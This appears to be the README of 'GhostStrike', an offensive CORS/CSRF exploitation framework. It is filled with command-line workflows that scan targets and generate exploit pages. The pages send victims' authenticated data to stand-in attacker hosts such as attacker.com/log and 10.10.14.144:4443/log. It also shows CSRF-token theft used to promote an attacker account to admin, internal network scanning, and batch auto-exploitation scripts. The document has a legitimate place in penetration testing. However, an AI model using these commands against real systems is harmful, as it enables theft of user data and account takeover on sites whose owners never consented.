# GhostStrike

<div align="center">

```
   ▄████  ██░ ██  ▒█████    ██████ ▄▄▄█████▓  ██████ ▄▄▄█████▓ ██▀███   ██▓ ██ ▄█▀▓█████ 
  ██▒ ▀█▒▓██░ ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒▒██    ▒ ▓  ██▒ ▓▒▓██ ▒ ██▒▓██▒ ██▄█▒ ▓█   ▀ 
 ▒██░▄▄▄░▒██▀▀██░▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░░ ▓██▄   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██▒▓███▄░ ▒███   
 ░▓█  ██▓░▓█ ░██ ▒██   ██░  ▒   ██▒░ ▓██▓ ░   ▒   ██▒░ ▓██▓ ░ ▒██▀▀█▄  ░██░▓██ █▄ ▒▓█  ▄ 
 ░▒▓███▀▒░▓█▒░██▓░ ████▓▒░▒██████▒▒  ▒██▒ ░ ▒██████▒▒  ▒██▒ ░ ░██▓ ▒██▒░██░▒██▒ █▄░▒████▒
  ░▒   ▒  ▒ ░░▒░▒░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░   ▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒▓ ░▒▓░░▓  ▒ ▒▒ ▓▒░░ ▒░ ░
   ░   ░  ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░▒  ░ ░    ░    ░ ░▒  ░ ░    ░      ░▒ ░ ▒░ ▒ ░░ ░▒ ▒░ ░ ░  ░
 ░ ░   ░  ░  ░░ ░░ ░ ░ ▒  ░  ░  ░    ░      ░  ░  ░    ░        ░░   ░  ▒ ░░ ░░ ░    ░   
       ░  ░  ░  ░    ░ ░        ░                 ░              ░      ░  ░  ░      ░  ░
```

**Advanced CORS/CSRF Exploitation Framework**
*By Ghost Ops Security*

</div>

---

## Overview

**GhostStrike** is a comprehensive penetration testing framework for identifying and exploiting CORS (Cross-Origin Resource Sharing) and CSRF (Cross-Site Request Forgery) vulnerabilities. Built for professional security assessments, bug bounty hunting, and red team operations.

### Key Capabilities

- **🔍 Automated Vulnerability Scanning** - Detect CORS misconfigurations automatically
- **⚡ Smart Exploit Generation** - Generate payloads based on scan results
- **🎯 Multiple Attack Vectors** - CORS exfiltration, CSRF bypasses, token extraction
- **🌐 Built-in Server** - HTTPS server with SSL for payload delivery
- **📊 Network Scanning** - Internal network discovery via CORS
- **🔧 Flexible Workflows** - Auto-exploit or manual attack selection

---

## Features

### Vulnerability Detection
- ✅ Arbitrary Origin Reflection
- ✅ Null Origin Trust
- ✅ Wildcard CORS Misconfiguration
- ✅ Improper Origin Whitelisting
- ✅ CSRF Token Bypass via CORS

### Exploitation Techniques
- ✅ **CORS Data Exfiltration** - Steal authenticated data
- ✅ **Null Origin Exploitation** - Sandboxed iframe attacks
- ✅ **Wildcard CORS Abuse** - Internal network attacks
- ✅ **CSRF Token Extraction** - Bypass CSRF protections
- ✅ **Network Scanning** - Discover internal hosts via CORS

### Advanced Features
- ✅ **Scan-to-Exploit Automation** - Automatically generate exploits from scan results
- ✅ **Element Extraction** - Target specific HTML elements
- ✅ **Authentication Support** - Custom cookies and headers
- ✅ **SSL/TLS Support** - Built-in HTTPS server
- ✅ **Payload Customization** - Fine-tune exploits
- ✅ **Multi-Target Support** - Batch scanning and exploitation

---

## Installation

### Prerequisites
- Python 3.8 or higher
- pip package manager

### Quick Install

```bash
# Clone the repository
git clone https://github.com/ghostops/ghoststrike.git
cd ghoststrike

# Install dependencies
pip install -r requirements.txt

# Make executable
chmod +x ghoststrike.py

# Run
python3 ghoststrike.py --help
```

### Dependencies
```
requests>=2.31.0
urllib3>=2.0.0
```

---

## Quick Start

### 1. Scan for Vulnerabilities

```bash
# Basic scan
python3 ghoststrike.py --scan -u https://target.com/api/data

# Authenticated scan
python3 ghoststrike.py --scan -u https://target.com/api/data \
  -c "session=abc123" \
  -H "Authorization: Bearer token123"

# Verbose scan
python3 ghoststrike.py --scan -u https://target.com/api/data -v
```

### 2. Auto-Exploit (Fastest)

```bash
# Scan and auto-generate exploit
python3 ghoststrike.py --scan -u https://target.com/api/data \
  --auto-exploit -e https://attacker.com/log \
  --server --ssl --port 4443
```

### 3. Manual Attack Selection

```bash
# Scan first to identify vulnerabilities
python3 ghoststrike.py --scan -u https://target.com/api/data -v

# Choose specific attack based on findings
python3 ghoststrike.py --generate cors-exfil \
  -t https://target.com/api/data \
  -e https://attacker.com/log \
  --server --ssl --port 4443
```

---

## Usage

### Scan Mode

Identify CORS/CSRF vulnerabilities and get attack recommendations:

```bash
python3 ghoststrike.py --scan -u <target-url> [options]

Options:
  -u, --url URL              Target URL to scan
  -c, --cookie COOKIE        Cookie header (session=abc123)
  -H, --header HEADER        Custom headers (can be used multiple times)
  -v, --verbose              Verbose output
```

**Example Output:**
```
[!] Found 2 vulnerability(ies):

[1] Arbitrary Origin Reflection
    Severity: High
    Credentials: True
    
    Available Attacks:
      → CORS Arbitrary Origin (cors-exfil)
      → Full data exfiltration with credentials

Recommended Command:
  ghoststrike --generate cors-exfil -t <target> -e <exfil>
```

### Generate Mode

Generate specific exploit payloads:

```bash
python3 ghoststrike.py --generate <attack-type> [options]

Attack Types:
  cors-exfil        CORS arbitrary origin exploitation
  cors-null         CORS null origin exploitation
  cors-wildcard     CORS wildcard exploitation
  csrf-get          CSRF via GET request
  csrf-post         CSRF via POST request
  csrf-bypass       CSRF token bypass via CORS

Options:
  -t, --target URL          Target URL
  -e, --exfil URL           Exfiltration URL
  --element-id ID           HTML element ID to extract
  -p, --params PARAMS       Parameters (key=value,key2=value2)
  -o, --output FILE         Save payload to file
```

### Server Mode

Start built-in exploit server:

```bash
python3 ghoststrike.py --server [options]

Options:
  --host HOST              Server host (default: 0.0.0.0)
  --port PORT              Server port (default: 8000)
  --ssl                    Enable HTTPS
  --cert FILE              SSL certificate file
  --key FILE               SSL key file
```

### Interactive Mode

Guided payload generation:

```bash
python3 ghoststrike.py --interactive
```

---

## Common Workflows

### Workflow 1: Full Automated Exploitation

```bash
# One command: scan → exploit → serve
python3 ghoststrike.py --scan -u https://target.com/api/profile \
  --auto-exploit -e https://10.10.14.144:4443/log \
  --server --ssl --port 4443

# Deliver: https://10.10.14.144:4443/exploit
```

### Workflow 2: Scan → Choose → Exploit

```bash
# Step 1: Scan and identify
python3 ghoststrike.py --scan -u https://target.com/api/profile -v

# Step 2: Review available attacks in output

# Step 3: Generate specific exploit
python3 ghoststrike.py --generate cors-exfil \
  -t https://target.com/api/profile \
  -e https://10.10.14.144:4443/log \
  --element-id userData \
  --server --ssl --port 4443
```

### Workflow 3: Multi-Target Assessment

```bash
# Scan multiple endpoints
for endpoint in /api/users /api/profile /admin/data; do
  python3 ghoststrike.py --scan -u "https://target.com$endpoint" -v \
    > "scan_${endpoint//\//_}.txt"
done

# Generate exploits for vulnerable endpoints
python3 ghoststrike.py --scan -u https://target.com/api/users \
  --auto-exploit -e https://10.10.14.144:4443/log \
  -o exploit_users.html
```

### Workflow 4: Authenticated Scanning

```bash
# Extract session cookie from browser
SESSION="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Scan with authentication
python3 ghoststrike.py --scan -u https://target.com/api/data \
  -c "session=$SESSION" \
  -H "Authorization: Bearer token123" \
  --auto-exploit -e https://10.10.14.144:4443/log \
  --server --ssl --port 4443
```

---

## Attack Techniques

### 1. CORS Arbitrary Origin Exploitation

**Vulnerability:** Server reflects any origin in `Access-Control-Allow-Origin`

**Exploit:**
```bash
python3 ghoststrike.py --generate cors-exfil \
  -t https://target.com/api/sensitive \
  -e https://attacker.com/log \
  --element-id secretData
```

**What happens:**
1. Victim visits attacker page
2. JavaScript makes authenticated request to target
3. Response data is exfiltrated to attacker server
4. Works because CORS allows arbitrary origins

### 2. CORS Null Origin Exploitation

**Vulnerability:** Server trusts `Origin: null`

**Exploit:**
```bash
python3 ghoststrike.py --generate cors-null \
  -t https://target.com/api/data \
  -e https://attacker.com/log
```

**What happens:**
1. Uses sandboxed iframe to generate null origin
2. Bypasses origin-based CORS restrictions
3. Exfiltrates authenticated data

### 3. CSRF Token Bypass

**Vulnerability:** CORS misconfiguration + CSRF protection

**Exploit:**
```bash
python3 ghoststrike.py --generate csrf-bypass \
  -t https://target.com/admin/action \
  --csrf-endpoint https://target.com/profile \
  --token-id csrf_token \
  --username attacker
```

**What happens:**
1. Extracts CSRF token via CORS
2. Uses token in state-changing request
3. Bypasses CSRF protection

### 4. Internal Network Scanning

**Vulnerability:** Wildcard CORS on internal services

**Interactive mode:**
```bash
python3 ghoststrike.py --interactive
# Select option 8: Network Scanner
```

**Manual:**
```bash
python3 ghoststrike.py --generate cors-wildcard \
  -t http://192.168.1.50/admin \
  -e https://attacker.com/log
```

---

## Real-World Examples

### Example 1: API Data Exfiltration

**Target:** Company API with user data

```bash
# Scan the API
python3 ghoststrike.py --scan -u https://api.company.com/v1/users \
  -H "Authorization: Bearer eyJhbGc..." -v

# Output shows: Arbitrary Origin Reflection (High)

# Generate exploit
python3 ghoststrike.py --generate cors-exfil \
  -t https://api.company.com/v1/users \
  -e https://10.10.14.144:4443/log \
  --element-id userList \
  --server --ssl --port 4443

# Deliver: https://10.10.14.144:4443/exploit
```

**Result:**
```
[+] EXFILTRATED DATA:
<ul id="userList">
  <li>admin@company.com</li>
  <li>user1@company.com</li>
  <li>user2@company.com</li>
  ...
</ul>

[*] Full data saved to: ghoststrike_exfil.txt
```

### Example 2: Admin Action Bypass

**Target:** Admin panel with CSRF protection

```bash
# Scan for CORS
python3 ghoststrike.py --scan -u https://admin.target.com/profile -v

# Found: Arbitrary Origin Reflection + CSRF tokens

# Generate bypass exploit
python3 ghoststrike.py --generate csrf-bypass \
  -t https://admin.target.com/users/promote \
  --csrf-endpoint https://admin.target.com/profile \
  --token-id csrf_token \
  --username attacker \
  --server --ssl --port 4443
```

**Result:** Admin account created with extracted CSRF token

### Example 3: Internal Network Discovery

**Target:** Public-facing app with internal service access

```bash
# Interactive network scanner
python3 ghoststrike.py --interactive

# Select: 8 (Network Scanner)
# Enter: 192.168.1.1/24
# Port: 80

# Discovers: 192.168.1.50, 192.168.1.100, 192.168.1.150

# Exploit discovered internal services
python3 ghoststrike.py --generate cors-wildcard \
  -t http://192.168.1.50/admin/api \
  -e https://10.10.14.144:4443/log \
  --server --ssl --port 4443
```

---

## Advanced Usage

### Custom Payload Templates

Save generated payload and modify:

```bash
# Generate and save
python3 ghoststrike.py --generate cors-exfil \
  -t https://target.com/api \
  -e https://attacker.com/log \
  -o custom_exploit.html

# Edit custom_exploit.html
# Add custom parsing logic

# Serve modified payload
python3 ghoststrike.py --server --ssl --port 4443
# Paste custom payload when prompted
```

### Batch Scanning

```bash
#!/bin/bash
# scan_targets.sh

TARGETS_FILE="targets.txt"
EXFIL_URL="https://10.10.14.144:4443/log"

while IFS= read -r target; do
  echo "[*] Scanning: $target"
  
  python3 ghoststrike.py --scan -u "$target" \
    --auto-exploit -e "$EXFIL_URL" \
    -o "exploit_$(echo $target | md5sum | cut -d' ' -f1).html" \
    2>&1 | tee "scan_$(echo $target | md5sum | cut -d' ' -f1).log"
    
done < "$TARGETS_FILE"

echo "[*] Scans complete. Starting server..."
python3 ghoststrike.py --server --ssl --port 4443
```

### Authenticated Multi-Endpoint Testing

```bash
#!/bin/bash
# test_api.sh

API_BASE="https://api.target.com"
TOKEN="Bearer eyJhbGciOiJIUzI1NiI..."
EXFIL="https://10.10.14.144:4443/log"

for endpoint in "/v1/users" "/v1/profile" "/v1/settings" "/admin/data"; do
  echo "[*] Testing: $endpoint"
  
  python3 ghoststrike.py --scan -u "$API_BASE$endpoint" \
    -H "Authorization: $TOKEN" \
    --auto-exploit -e "$EXFIL" \
    -o "exploit${endpoint//\//_}.html"
done
```

---

## Vulnerability Coverage

### CORS Misconfigurations

| Vulnerability | Severity | Detection | Exploitation |
|--------------|----------|-----------|--------------|
| Arbitrary Origin Reflection | High | ✅ | ✅ |
| Null Origin Trust | High | ✅ | ✅ |
| Wildcard with Credentials | High | ✅ | ✅ |
| Improper Whitelist (Prefix) | High | ✅ | ✅ |
| Improper Whitelist (Suffix) | High | ✅ | ✅ |
| Wildcard (No Credentials) | Medium | ✅ | ✅ |

### CSRF Vulnerabilities

| Vulnerability | Severity | Detection | Exploitation |
|--------------|----------|-----------|--------------|
| No CSRF Protection | High | Manual | ✅ |
| CSRF Token Bypass (CORS) | High | ✅ | ✅ |
| Referer Bypass | Medium | Manual | ✅ |

---

## Legal Disclaimer

**IMPORTANT: READ BEFORE USING**

GhostStrike is designed for **authorized security testing only**. You must have explicit permission to test any systems.

### Authorized Use Cases
✅ Penetration testing with written authorization  
✅ Bug bounty programs with explicit scope  
✅ Red team exercises with company approval  
✅ Security research in controlled environments  
✅ Educational purposes in lab environments  

### Prohibited Use Cases
❌ Unauthorized testing of systems you don't own  
❌ Attacking systems without explicit permission  
❌ Malicious use or intent to cause harm  
❌ Violating computer fraud laws (CFAA, Computer Misuse Act, etc.)  
❌ Testing production systems without approval  

**By using GhostStrike, you agree to:**
1. Only use on systems you own or have written permission to test
2. Comply with all applicable laws and regulations
3. Take responsibility for your actions
4. Not hold the authors liable for misuse

**Unauthorized access to computer systems is illegal. The authors assume no liability for misuse of this tool.**

---

## Contributing

Contributions are welcome! Please follow these guidelines:

### Reporting Bugs
- Use GitHub Issues
- Include GhostStrike version
- Provide reproduction steps
- Include error messages

### Feature Requests
- Open a GitHub Issue
- Describe the feature
- Explain the use case
- Provide examples if possible

### Pull Requests
1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

### Code Style
- Follow PEP 8 for Python code
- Add comments for complex logic
- Update documentation
- Include examples

---

## Troubleshooting

### Common Issues

**Issue: "No vulnerabilities found"**
```bash
# Try with authentication
python3 ghoststrike.py --scan -u <target> -c "session=xxx" -v

# Verify target is accessible
curl -I <target>
```

**Issue: "Connection refused"**
```bash
# Check if target is accessible
ping target.com

# Try without SSL
python3 ghoststrike.py --server --port 8000
```

**Issue: "Base64 decode error"**
```bash
# Fixed in latest version!
# Check ghoststrike_exfil.txt for full data
# Falls back to raw data if needed
```

**Issue: "Module not found"**
```bash
# Install dependencies
pip install -r requirements.txt

# Or manually
pip install requests urllib3
```

---

## Performance

- **Scan Speed:** ~2-5 seconds per endpoint
- **Memory Usage:** ~50-100 MB
- **Concurrent Scans:** Supports batch processing
- **Payload Size:** 2-10 KB typical

---

## Updates

### Version 1.0.0 (Current)
- ✅ Enhanced scan output with available attacks
- ✅ Fixed base64 decoding issues
- ✅ Added cors-null and cors-wildcard generation
- ✅ Improved error handling
- ✅ Better output truncation
- ✅ Complete documentation suite

### Upcoming Features
- 🔜 JSON output format
- 🔜 Report generation
- 🔜 Database logging
- 🔜 API integration
- 🔜 Web UI

---

## 📞 Support

- **GitHub Issues:** [github.com/ghostops/ghoststrike/issues](https://github.com/ghostops/ghoststrike/issues)

---

## Credits

**Developed by Ghost Ops Security**

Special thanks to:
- The security research community
- Bug bounty hunters
- Penetration testers worldwide

---

## License

MIT License - See [LICENSE](LICENSE) file for details

Copyright (c) 2025 Ghost Ops Security

---

<div align="center">

*Ethical Hacking • Penetration Testing • Security Research*

</div>
